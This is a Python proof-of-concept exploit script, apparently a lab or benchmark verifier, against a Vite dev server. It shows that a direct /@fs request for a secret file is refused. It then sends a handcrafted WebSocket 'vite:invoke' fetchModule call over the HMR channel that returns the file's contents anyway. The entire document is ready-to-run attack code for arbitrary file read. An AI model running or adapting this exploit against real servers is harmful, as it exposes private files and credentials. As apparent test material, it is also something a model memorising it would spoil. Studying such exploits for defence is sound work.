#!/usr/bin/env python3
"""Read a private file through Vite's unauthenticated HMR fetchModule call."""

import base64
import hashlib
import http.client
import json
import os
import socket
import struct
import urllib.parse


FLAG_PATH = "/tmp/vite004-secret"
DIRECT_PATH = "/@fs/tmp/vite004-secret?raw"
WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


def read_exact(stream, length: int) -> bytes:
    chunks = []
    remaining = length
    while remaining:
        chunk = stream.read(remaining)
        if not chunk:
            raise EOFError("WebSocket closed before the expected response")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def receive_frame(stream) -> tuple[int, bytes]:
    first, second = read_exact(stream, 2)
    length = second & 0x7F
    if length == 126:
        length = struct.unpack("!H", read_exact(stream, 2))[0]
    elif length == 127:
        length = struct.unpack("!Q", read_exact(stream, 8))[0]
    mask = read_exact(stream, 4) if second & 0x80 else None
    payload = read_exact(stream, length)
    if mask is not None:
        payload = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
    return first & 0x0F, payload


def send_text(connection: socket.socket, text: str) -> None:
    payload = text.encode("utf-8")
    header = bytearray([0x81])
    if len(payload) < 126:
        header.append(0x80 | len(payload))
    elif len(payload) < 65536:
        header.append(0x80 | 126)
        header.extend(struct.pack("!H", len(payload)))
    else:
        header.append(0x80 | 127)
        header.extend(struct.pack("!Q", len(payload)))
    mask = os.urandom(4)
    body = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
    connection.sendall(bytes(header) + mask + body)


def request_direct(target: urllib.parse.SplitResult) -> int:
    connection = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=30)
    try:
        connection.request("GET", DIRECT_PATH)
        response = connection.getresponse()
        response.read()
        return response.status
    finally:
        connection.close()


def fetch_module(target: urllib.parse.SplitResult) -> tuple[str, str]:
    host = target.hostname
    port = target.port or 80
    with socket.create_connection((host, port), timeout=30) as connection:
        connection.settimeout(30)
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        headers = (
            "GET / HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "Sec-WebSocket-Protocol: vite-hmr\r\n"
            "\r\n"
        )
        connection.sendall(headers.encode("ascii"))
        stream = connection.makefile("rb")
        status = stream.readline().decode("ascii").strip()
        response_headers = {}
        while True:
            line = stream.readline().decode("ascii").strip()
            if not line:
                break
            name, value = line.split(":", 1)
            response_headers[name.lower()] = value.strip()
        if not status.startswith("HTTP/1.1 101"):
            raise RuntimeError(f"WebSocket handshake failed: {status}")
        expected_accept = base64.b64encode(
            hashlib.sha1((key + WEBSOCKET_GUID).encode("ascii")).digest()
        ).decode("ascii")
        if response_headers.get("sec-websocket-accept") != expected_accept:
            raise RuntimeError("WebSocket accept value did not match this handshake")
        if response_headers.get("sec-websocket-protocol") != "vite-hmr":
            raise RuntimeError("Vite HMR subprotocol was not selected")
        payload = {
            "type": "custom",
            "event": "vite:invoke",
            "data": {
                "id": "send:0",
                "name": "fetchModule",
                "data": [f"file://{FLAG_PATH}?raw"],
            },
        }
        send_text(connection, json.dumps(payload, separators=(",", ":")))
        for _ in range(8):
            opcode, message = receive_frame(stream)
            if opcode != 1:
                continue
            event = json.loads(message)
            if event.get("event") != "vite:invoke":
                continue
            response = event.get("data", {})
            if response.get("id") != "response:0":
                continue
            if "error" in response.get("data", {}):
                raise RuntimeError(f"fetchModule was rejected: {response['data']['error']}")
            code = response.get("data", {}).get("result", {}).get("code")
            if not isinstance(code, str) or not code.startswith("export default "):
                raise RuntimeError("fetchModule did not return the private file bytes")
            content = json.loads(code.removeprefix("export default "))
            if not isinstance(content, str):
                raise RuntimeError("fetchModule returned a non-string module")
            return content, response["id"]
    raise RuntimeError("Vite did not respond to fetchModule")


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    target = urllib.parse.urlsplit(target_url)
    if target.scheme != "http" or not target.hostname:
        raise ValueError("target URL must be HTTP with a hostname")
    direct_status = request_direct(target)
    if direct_status != 403:
        raise RuntimeError(f"direct private file request returned HTTP {direct_status}")
    content, response_id = fetch_module(target)
    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
        "direct_status": direct_status,
        "websocket_response_id": response_id,
    }))


if __name__ == "__main__":
    main()
